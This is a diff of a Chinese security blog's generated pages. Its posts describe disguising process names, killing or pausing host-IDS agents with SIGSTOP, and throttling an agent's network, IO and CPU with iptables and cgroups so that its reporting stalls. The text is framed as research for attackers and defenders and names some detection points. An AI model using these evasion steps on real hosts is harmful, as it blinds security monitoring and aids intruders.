-<h2 id="使用cgroup限制cpu使用"><a href="#使用cgroup限制cpu使用" class="headerlink" title="使用cgroup限制cpu使用"></a>使用cgroup限制cpu使用</h2><ul>
-<li><p>利用<code>stress</code>命令创建高cpu占用的”测试进程”</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp test]# stress -c 1 &amp;</span><br><span class="line">[1] 27924</span><br><span class="line">[root@instance-fj5pftdp test]# stress: info: [27924] dispatching hogs: 1 cpu, 0 io, 0 vm, 0 hdd</span><br><span class="line"></span><br><span class="line">[root@instance-fj5pftdp test]# ps aux|grep stress</span><br><span class="line">root     27924  0.0  0.0   7312   424 pts&#x2F;65   S    23:02   0:00 stress -c 1</span><br><span class="line">root     27925 96.0  0.0   7312    96 pts&#x2F;65   R    23:02   0:10 stress -c 1    &#x2F;&#x2F; 实际工作的进程</span><br></pre></td></tr></table></figure>
-
-<p>验证cpu占用，可以看出来单核cpu占用100%</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp test]# top -b -p 27925</span><br><span class="line">...</span><br><span class="line">  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND</span><br><span class="line">27925 root      20   0    7312     96      0 R 100.0  0.0   2:32.58 stress</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>利用<code>cgroup</code>限制”测试进程”的使用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# mkdir &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;cpu&#x2F;test-cpu-limit</span><br><span class="line">[root@instance-fj5pftdp ~]# echo 27925 &gt; &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;cpu&#x2F;test-cpu-limit&#x2F;tasks    &#x2F;&#x2F; 进程号是27925</span><br><span class="line">[root@instance-fj5pftdp ~]# echo 10000 &gt; &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;cpu&#x2F;test-cpu-limit&#x2F;cpu.cfs_quota_us   &#x2F;&#x2F; quota &#x3D; 10ms</span><br><span class="line">[root@instance-fj5pftdp ~]# echo 50000 &gt; &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;cpu&#x2F;test-cpu-limit&#x2F;cpu.cfs_period_us  &#x2F;&#x2F; period &#x3D; 50ms</span><br></pre></td></tr></table></figure>
-
-<p>限制cpu使用率是20%（10ms/50ms）</p>
-<p>查看是否限制stress进程</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# top -b -p 27925</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND</span><br><span class="line">27925 root      20   0    7312     96      0 R  20.0  0.0   9:30.61 stress</span><br></pre></td></tr></table></figure>
-<p>可以看到限制成功</p>
-</li>
-</ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>使用cgroup限制cpu、io等是很简单的。</p>
-<p>因为用cgroup”限制网络流量”没有测试成功，所以也就没有记录。</p>
-<p>本文提到的手段没有在真实的对抗中实践过，仅仅是我自己的研究，欢迎与我交流。</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://qastack.cn/superuser/287371/obtain-kernel-config-from-currently-running-linux-system">怎么查看内核配置</a></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE-%E6%94%BB%E9%98%B2%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%B8%80%EF%BC%89/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1006,155 +1138,6 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%A6%82%E4%BD%95%E6%94%B9%E5%8F%98%E8%BF%9B%E7%A8%8B%E5%90%8D%E7%A7%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E5%A6%82%E4%BD%95%E6%94%B9%E5%8F%98%E8%BF%9B%E7%A8%8B%E5%90%8D%E7%A7%B0/" class="post-title-link" itemprop="url">如何改变进程名称</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>之前在<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/pFpGujKnXMhOh5ef3Z9H2g">测试反弹shell</a>时，测试发现：某厂商会根判断程命令是否是bash、sh等脚本解释器，如果修改bash、sh等文件名后反弹shell，就会绕过厂商的反弹shell防护。</p>
-<blockquote>
-<p>需要注意的的是：”修改敏感文件名、复制敏感文件“本身非常有可能被hids当作一种”异常文件操作”行为。</p>
-</blockquote>
-<p>还有一些场景下也会涉及到”进程名称的修改”：比如某些恶意软件会修改进程名称，伪装成”内核线程”。</p>
-<p>所以可以说，在”进程名称的修改”这个点上是存在一些攻防对抗的。</p>
-<p>本文研究：</p>
-<ul>
-<li>除了直接修改程序文件名，还有哪些方式来修改进程名称？</li>
-<li>作为防守方，怎么发现和检测这些”修改方式”？</li>
-</ul>
-<p>本文应该适合 做应急响应、hids和”对linux后渗透感兴趣”的读者阅读，文章中给出了我对每种隐藏方式的效果验证，方便读者对隐藏效果做评估。</p>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
-<li><p>怎么查看”进程名称”？</p>
-<p>在 /proc/{pid} 目录下有好几个文件都存放有”进程名称”相关的信息，如下图：<br><img src="https://user-images.githubusercontent.com/1846319/131244474-9dbb39c7-ba13-4033-a213-809a7773e443.png" alt="image"></p>
-<p>更常见的情况下，我们是通过ps、top等命令来查看进程信息。</p>
-<p>ps命令也是基于 /proc/{pid}/stat、/proc/{pid}/status、/proc/{pid}/cmdline 等文件来获取进程信息。可以通过strace命令查看系统调用验证一下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# strace ps aux 2&gt;&amp;1 |grep proc |grep 29224</span><br><span class="line">stat(&quot;&#x2F;proc&#x2F;29224&quot;, &#123;st_mode&#x3D;S_IFDIR|0555, st_size&#x3D;0, ...&#125;) &#x3D; 0</span><br><span class="line">open(&quot;&#x2F;proc&#x2F;29224&#x2F;stat&quot;, O_RDONLY)      &#x3D; 6</span><br><span class="line">open(&quot;&#x2F;proc&#x2F;29224&#x2F;status&quot;, O_RDONLY)    &#x3D; 6</span><br><span class="line">open(&quot;&#x2F;proc&#x2F;29224&#x2F;cmdline&quot;, O_RDONLY)   &#x3D; 6</span><br><span class="line">readlink(&quot;&#x2F;proc&#x2F;29224&#x2F;fd&#x2F;2&quot;, &quot;&#x2F;42&quot;, 127) &#x3D; 3</span><br><span class="line">[root@instance-fj5pftdp ~]#</span><br><span class="line">[root@instance-fj5pftdp ~]# strace ps -A 2&gt;&amp;1 |grep proc |grep 29224</span><br><span class="line">stat(&quot;&#x2F;proc&#x2F;29224&quot;, &#123;st_mode&#x3D;S_IFDIR|0555, st_size&#x3D;0, ...&#125;) &#x3D; 0</span><br><span class="line">open(&quot;&#x2F;proc&#x2F;29224&#x2F;stat&quot;, O_RDONLY)      &#x3D; 6</span><br><span class="line">open(&quot;&#x2F;proc&#x2F;29224&#x2F;status&quot;, O_RDONLY)    &#x3D; 6</span><br><span class="line">readlink(&quot;&#x2F;proc&#x2F;29224&#x2F;fd&#x2F;2&quot;, &quot;&#x2F;42&quot;, 127) &#x3D; 3</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>怎么修改”进程名称”？</p>
-<p>改变进程名包括以下方式：</p>
-<ul>
-<li>execve系统调用</li>
-<li>prctl系统调用</li>
-<li>修改进程argv</li>
-<li>软链接</li>
-</ul>
-</li>
-</ul>
-<h1 id="通过”execve系统调用”改变进程名称"><a href="#通过”execve系统调用”改变进程名称" class="headerlink" title="通过”execve系统调用”改变进程名称"></a>通过”execve系统调用”改变进程名称</h1><ul>
-<li><p>怎么通过”execve系统调用”可以改变进程名称？</p>
-<p>execve系统调用的第二个参数可以指定cmdline，如下：</p>
-<p><img src="https://user-images.githubusercontent.com/1846319/131255950-11235b12-c64c-4572-8a0d-521a299b3ee6.png" alt="image"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">     char * execve_str[] &#x3D; &#123;&quot;test_sleep&quot;,&quot;10000&quot;&#125;;   &#x2F;&#x2F; 第一个参数会出现在&#x2F;pro&#x2F;&#123;pid&#125;&#x2F;cmdline</span><br><span class="line">     char * env[] &#x3D; &#123;NULL&#125;;</span><br><span class="line">     if (execve(&quot;&#x2F;usr&#x2F;bin&#x2F;sleep&quot;,execve_str,env) &lt;0 )&#123;</span><br><span class="line">         perror(&quot;error on exec&quot;);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>更简便的方式是：通过bash的exec命令的<code>-a</code>参数改变进程名称</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec -a &quot;xxx&quot; sleep 10000</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>效果</p>
-<p><img src="https://user-images.githubusercontent.com/1846319/131254028-441d0792-68b5-4eab-b2a2-6208fe6f2c70.png" alt="image"></p>
-<p>可以看到：<code>ps -A</code>可以看到sleep文件名信息，<code>ps aux</code>无法看到。</p>
-<p><img src="https://user-images.githubusercontent.com/1846319/131253952-c2ea6b18-614f-4145-b7a5-c05b97235a29.png" alt="image"></p>
-<p>可以看到：只有cmdline被修改了。</p>
-</li>
-</ul>
-<h1 id="通过”prctl系统调用”改变进程名称"><a href="#通过”prctl系统调用”改变进程名称" class="headerlink" title="通过”prctl系统调用”改变进程名称"></a>通过”prctl系统调用”改变进程名称</h1><ul>
-<li><p>怎么通过”prctl系统调用”改变进程名称？</p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/250654.html">Linux进程隐藏：初级篇</a> 这篇文章有demo代码</p>
-</li>
-<li><p>效果<br><img src="https://user-images.githubusercontent.com/1846319/131256636-e9edd238-3856-4f90-a126-30570e44a472.png" alt="image"></p>
-<p>可以看到虽然stat、comm、status文件已经修改，但是cmdline、exe等文件仍然有原程序名信息。</p>
-</li>
-<li><p>怎么检测？</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/bytedance/Elkeid/blob/main/driver/README-zh_CN.md">字节hids</a> hook了这个系统调用</p>
-</li>
-</ul>
-<h1 id="通过”修改进程argv-0-”隐藏进程名称"><a href="#通过”修改进程argv-0-”隐藏进程名称" class="headerlink" title="通过”修改进程argv[0]”隐藏进程名称"></a>通过”修改进程argv[0]”隐藏进程名称</h1><ul>
-<li><p>怎么通过”修改进程argv[0]”隐藏进程名称？</p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/250654.html">Linux进程隐藏：初级篇</a> 这篇文章有demo代码</p>
-</li>
-<li><p>谁用了这种方式？</p>
-<p>恶意软件<a target="_blank" rel="noopener" href="https://github.com/n1nj4sec/pupy/blob/unstable/pupy/packages/linux/all/hide_process.py">puppy</a> 就用到了这种方式修改进程名为”[kworker/2:0]”。</p>
-<blockquote>
-<p>“[XXXX]”这种进程名都是内核线程</p>
-</blockquote>
-<p><img src="https://user-images.githubusercontent.com/1846319/131245230-c8f97321-5d04-41f9-a347-f7a4f69e3794.png" alt="image"></p>
-</li>
-<li><p>效果</p>
-<p><img src="https://user-images.githubusercontent.com/1846319/131253587-ec40a6c2-2b19-4df1-90d3-68a6772be975.png" alt="image"></p>
-<p>可以看到：只有cmdline被修改了。</p>
-</li>
-</ul>
-<h1 id="通过”软链接”改变进程名称"><a href="#通过”软链接”改变进程名称" class="headerlink" title="通过”软链接”改变进程名称"></a>通过”软链接”改变进程名称</h1><ul>
-<li><p>是什么？</p>
-<p>在 <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1609832">两个主题：躲避execve与分析/proc/目录</a> 这篇文章提到了：利用”软链接”可以改变进程信息，并且文件哈希和源文件不一致，这样可以用来躲避安全产品的监控。</p>
-</li>
-<li><p>效果<br><img src="https://user-images.githubusercontent.com/1846319/131256254-29bd80e0-8475-47f2-a13f-c6d4bfcc3b39.png" alt="image"></p>
-<p>可以看到：只有exe文件还有原程序信息，所以这种方式隐藏进程名的效果是最好的。</p>
-</li>
-</ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>可以有以下结论：</p>
-<ul>
-<li>单看四种隐藏方式，”软链接”这种方式隐蔽得最好；其他几种方式，comm、stat、cmdline、status文件中总会有原程序相关信息</li>
-<li>不论哪种方式，exe文件仍然有原程序相关信息</li>
-<li>像”prctl系统调用”这种方式应该避免使用</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE-%E6%94%BB%E9%98%B2%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%BA%8C%EF%BC%89/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1263,7 +1246,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%A6%82%E4%BD%95%E7%BB%93%E6%9D%9F%E5%92%8C%E6%9A%82%E5%81%9Cagent%E8%BF%9B%E7%A8%8B/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%A6%82%E4%BD%95%E9%99%90%E5%88%B6agent%E8%BF%9B%E7%A8%8B%E7%9A%84%E8%B5%84%E6%BA%90%E4%BD%BF%E7%94%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -1276,7 +1259,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E5%A6%82%E4%BD%95%E7%BB%93%E6%9D%9F%E5%92%8C%E6%9A%82%E5%81%9Cagent%E8%BF%9B%E7%A8%8B/" class="post-title-link" itemprop="url">如何结束和暂停agent进程</a>
+          <a href="/2021-12-26-%E5%A6%82%E4%BD%95%E9%99%90%E5%88%B6agent%E8%BF%9B%E7%A8%8B%E7%9A%84%E8%B5%84%E6%BA%90%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">如何限制agent进程的资源使用</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1300,86 +1283,108 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>就像 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/WQeOfZtyKndbDebe66-V_g">如何避免文件上报-制作大文件</a> 说的，hids agent会上报很多信息，安全防护策略也是围绕”agent上报的信息”制定的。</p>
-<p>那如果攻击者”结束、暂停agent进程”，导致agent功能废掉，是不是就能够绕过hids的防护呢？</p>
-<p>研究过程中，我发现并不能轻易地结束agent进程；”结束和暂停agent进程”会带来”心跳失联”的异常特征，可能引起”运营人员”的注意从而导致攻击行为暴露。</p>
-<p>本文主要讨论以下问题：</p>
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>在 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/WQeOfZtyKndbDebe66-V_g">如何避免文件上报-制作大文件</a> 问题背景中提到：agent会上报信息，甚至会上传文件。</p>
+<p>如果能够限制agent进程对系统资源的使用，是不是可能对”信息上报”造成影响。比如限制agent进程每秒只能读1字节的文件内容、限制agent上报文件带宽在1字节每秒、限制agent只能使用很少的cpu分片等等。</p>
+<p>本文记录对”限制资源使用”的实践：</p>
 <ul>
-<li>怎么结束agent进程？</li>
-<li>怎么暂停agent进程？</li>
-<li>“心跳失联”</li>
+<li>怎么限制进程的网络带宽</li>
+<li>怎么限制进程的io读速度</li>
+<li>怎么限制进程的cpu使用率</li>
 </ul>
-<h1 id="结束agent进程"><a href="#结束agent进程" class="headerlink" title="结束agent进程"></a>结束agent进程</h1><ul>
-<li><p>怎么结束agent进程？</p>
-<p>在linux上执行 <code>kill -SIGKILL 进程号</code> 是一定可以结束进程的，因为 SIGKILL信号不能被忽略或者做其他处理。</p>
-<p>但是我们杀掉hids agent进程后，agent进程会自动重启。</p>
+<p>“对进程资源的限制”有很多使用场景，比如我看到有人问 <a target="_blank" rel="noopener" href="https://github.com/Qianlitp/crawlergo/issues/22">怎么控制crawlergo爬虫的cpu和内存使用率</a>，再比如 hids本身也需要对cpu、内存等使用做限制。</p>
+<h1 id="agent进程带宽限速"><a href="#agent进程带宽限速" class="headerlink" title="agent进程带宽限速"></a>agent进程带宽限速</h1><ul>
+<li><p>为什么限速？</p>
+<p>如果能让agent进程每秒只能传输很少的字节数，就有可能拖慢agent上报信息的进度，从而干扰安全检测。重点是”网速变慢”能保证”agent心跳”能正常传到server，不至于在server端看到agent异常。</p>
 </li>
-<li><p>怎么实现”挂掉自动重启”？</p>
-<p>经过调研，”挂掉自动重启”机制在linux最常见的实现方式包括：</p>
+<li><p>在linux主机上怎么给进程限流呢？</p>
+<p>调研总结有两种方式：</p>
 <blockquote>
-<p>通过 systemd、supervisord 等实现</p>
-<p>crond：通过计划任务</p>
-<p>watchdog</p>
-</blockquote>
-<p><a target="_blank" rel="noopener" href="https://github.com/bytedance/Elkeid/blob/main/server/docs/quick-start-zh_CN.md">字节hids文档</a> 推荐的也是”systemd”和”crond”这两种方式。</p>
-<p><img src="https://images.gitee.com/uploads/images/2021/0923/234007_74229bc1_83508.png" alt="字节hids文档" title="屏幕截图.png"></p>
-<p>有对supervisord、systemd实现原理感兴趣的，可以看最后一节。</p>
-</li>
-<li><p>怎么结束被systemd、supervisord管理的进程？</p>
-<p>supervisord和systemd等管理的进程可以通过”supervisorctl”和”systemctl”等命令关掉。</p>
-<p>这两命令实际也是通过”本地socket通信”告诉supervisord和systemd结束进程，所以当没有办法使用”supervisorctl”和”systemctl”命令时，也可以编写程序直接和”本地socket文件”通信。</p>
-</li>
-</ul>
-<h1 id="暂停agent进程"><a href="#暂停agent进程" class="headerlink" title="暂停agent进程"></a>暂停agent进程</h1><ul>
-<li><p>怎么暂停agent进程？</p>
-<p>向进程发送SIGSTOP、SIGTSTP、SIGTTIN等信号都可能暂停进程，推荐用SIGSTOP信号，原因是进程收到其他信号还能忽略，收到SIGSTOP信号却只能暂停进程。</p>
-<p>这个结论可以在<code>man 7 signal</code>看到</p>
-<blockquote>
-<p>The signals SIGKILL and SIGSTOP cannot be caught, blocked, or ignored.</p>
+<p>cgroups + tc命令：可以实现对指定的进程限速</p>
+<p>iptables：可以实现对指定的tcp通信限速</p>
 </blockquote>
 </li>
 </ul>
-<ul>
-<li><p>“暂停的agent进程”是否会被自动重启或者恢复运行状态？</p>
-<p>这里还存在一个小问题：当子进程被暂停或者结束时，父进程是可以收到SIGCHLD信号的。那systemd遇到子进程暂停时，会不会重启进程？</p>
-<p>经过测试和源码对比，我的结论是：systemd不会。</p>
+<h2 id="使用iptables对进程限速"><a href="#使用iptables对进程限速" class="headerlink" title="使用iptables对进程限速"></a>使用iptables对进程限速</h2><ul>
+<li><p>怎么用iptables对进程限速？</p>
+<p>可以使用iptables的limit模块来完成。</p>
+<p>根据<code>man iptables-extensions</code>手册可知：limit模块使用”令牌桶算法”实现。</p>
+<p><code>--limit-burst</code>参数指定初始令牌数，<code>--limit</code>参数指定补充令牌的速率。</p>
+<p>举个例子，下面命令可以对目标ip”1.2.3.4”端口为5001的tcp通信做限速：桶最大值也是初始值就是10个tcp包，每秒新增1个tcp包，所以发包速率峰值基本上可以认为是”10个包/每秒”；当客户端每秒有100个包要发出去时，基本上到后面发包速度会基本限制在”1个包/每秒”；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# iptables -A OUTPUT -d 1.2.3.4&#x2F;32 -p tcp -m limit --limit 1&#x2F;sec --limit-burst 10 --dport 5001 -j ACCEPT</span><br><span class="line">[root@instance-fj5pftdp ~]# iptables -A OUTPUT -d 1.2.3.4&#x2F;32 -p tcp --dport 5001 -j DROP</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>测试某hids</p>
-<p>经过对某hids做测试，发现stop状态的agent进程会被恢复成运行状态。</p>
-<p>agent进程的父进程的父进程才是systemd，所以估计是agent父进程收到SIGCHLD信号后向agent进程发送了SIGCONT信号恢复运行状态。</p>
-<p>当把hids所有的agent进程都暂停后，符合预期：所有agent进程一直被暂停。</p>
-</li>
-</ul>
-<h1 id="“心跳失联”的问题"><a href="#“心跳失联”的问题" class="headerlink" title="“心跳失联”的问题"></a>“心跳失联”的问题</h1><ul>
-<li><p>“心跳失联”是什么？</p>
-<p>正常情况下，agent按照一定频率会发送”心跳包”告诉server自己存活。</p>
-<p>如果”结束和暂停agent进程”，就会影响到”心跳包”的发送。进而server端是可以感知到agent异常的。</p>
-<p>这种异常可能引起”运营人员”的注意从而导致攻击行为暴露。</p>
-</li>
-<li><p>怎么解决”心跳失联”的问题？</p>
-<p>凭空想象的一种解决方法：恶意样本 先暂停agent进程，等到恶意行为完成后，再恢复agent进程。</p>
-<p>这样心跳也存在，也有可能绕过hids防护。</p>
-</li>
-</ul>
-<h1 id="systemd是怎么知道”进程挂掉”？"><a href="#systemd是怎么知道”进程挂掉”？" class="headerlink" title="systemd是怎么知道”进程挂掉”？"></a>systemd是怎么知道”进程挂掉”？</h1><p>先说我验证的结论：</p>
-<ul>
-<li>systemd为sigchild信号注册了一个处理函数，函数内部调用waitid处理退出的子进程。</li>
-<li>当systemd管理的进程退出时，systemd进程会收到sigchild信号，进而跳转到处理函数。</li>
-</ul>
-<p>从<a target="_blank" rel="noopener" href="https://github.com/systemd/systemd/blob/71a80dcc0b64b01c73e7141c4292ef301543a011/src/core/manager.c">systemd源码</a>可以看到manager_setup_sigchld_event_source函数就是”sigchild信号的处理函数”。<br><img src="https://images.gitee.com/uploads/images/2021/0923/234046_4aa2c450_83508.png" alt="输入图片说明" title="屏幕截图.png"></p>
-<p>如果systemd进程号为1，也可以通过<code>strace -p 1</code>来验证结论：</p>
-<p>结束systemd管理的进程时（下面例子中是83206号进程），可以看到waitid系统调用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">waitid(P_ALL, 0, &#123;si_signo&#x3D;SIGCHLD, si_code&#x3D;CLD_KILLED, si_pid&#x3D;83206, si_uid&#x3D;0, si_status&#x3D;SIGKILL, si_utime&#x3D;0, si_stime&#x3D;0&#125;, WNOHANG|WEXITED|WNOWAIT, NULL) &#x3D; 0</span><br><span class="line">...</span><br><span class="line">waitid(P_PID, 83206, &#123;si_signo&#x3D;SIGCHLD, si_code&#x3D;CLD_KILLED, si_pid&#x3D;83206, si_uid&#x3D;0, si_status&#x3D;SIGKILL, si_utime&#x3D;0, si_stime&#x3D;0&#125;, WEXITED, NULL) &#x3D; 0</span><br><span class="line">waitid(P_ALL, 0, &#123;&#125;, WNOHANG|WEXITED|WNOWAIT, NULL) &#x3D; 0</span><br></pre></td></tr></table></figure>
+<li><p>实践验证限速效果</p>
+<p>准备两台机器：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* &#96;instance-fj5pftdp&#96;发包</span><br><span class="line">* &#96;1.2.3.4&#96;收包 (为了我避免暴露自己的虚机ip，这里用1.2.3.4代替)</span><br></pre></td></tr></table></figure>
 
-<p>supervisord和systemd有点类似，不一样的是supervisord似乎只用wait等系统调用，来判断子进程是否已经退出。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# ps aux|grep supervi</span><br><span class="line">root     13170  0.0  0.0  56368 12760 ?        Ss   6月01  71:47 &#x2F;usr&#x2F;bin&#x2F;python &#x2F;usr&#x2F;bin&#x2F;supervisord -c &#x2F;data&#x2F;poc-web-api&#x2F;docker&#x2F;supervisor.conf</span><br><span class="line">[root@instance-fj5pftdp ~]# strace -p 13170 2&gt;&amp;1 | grep -i wait</span><br><span class="line">...</span><br><span class="line">wait4(-1, 0x7fffbe389d9c, WNOHANG, NULL) &#x3D; 0</span><br><span class="line">wait4(-1, 0x7fffbe389d9c, WNOHANG, NULL) &#x3D; 0</span><br><span class="line">wait4(-1, 0x7fffbe389d9c, WNOHANG, NULL) &#x3D; 0</span><br><span class="line">wait4(-1, [&#123;WIFSIGNALED(s) &amp;&amp; WTERMSIG(s) &#x3D;&#x3D; SIGKILL&#125;], WNOHANG, NULL) &#x3D; 5557</span><br></pre></td></tr></table></figure>
+<p>在发包机器上 使用iptables限制通信，然后传输大文件，并使用tcpdump观察包速率</p>
+<p>第一步：设置iptables，指令如上</p>
+<p>第二步：传输大文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 使用&#96;truncate -s 1G bigfil&#96;创建&quot;稀疏文件&quot;</span><br><span class="line">* 使用&#96;nc 1.2.3.4 5001 &lt; bigfile&#96;传输文件</span><br></pre></td></tr></table></figure>
 
-
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
-<li>“结束进程”需要考虑到”进程挂掉重启”的场景</li>
-<li>“暂停进程”需要考虑到”父进程恢复进程状态”的场景</li>
+<p>第三步：使用tcpdump观察包速率：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# tcpdump -i eth0 &#39;port 5001 and ip dst 1.2.3.4&#39;</span><br><span class="line">22:52:00.743321 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [S], seq 2314647925, win 27200, options [mss 1360,sackOK,TS val 2324847321 ecr 0,nop,wscale 7], length 0</span><br><span 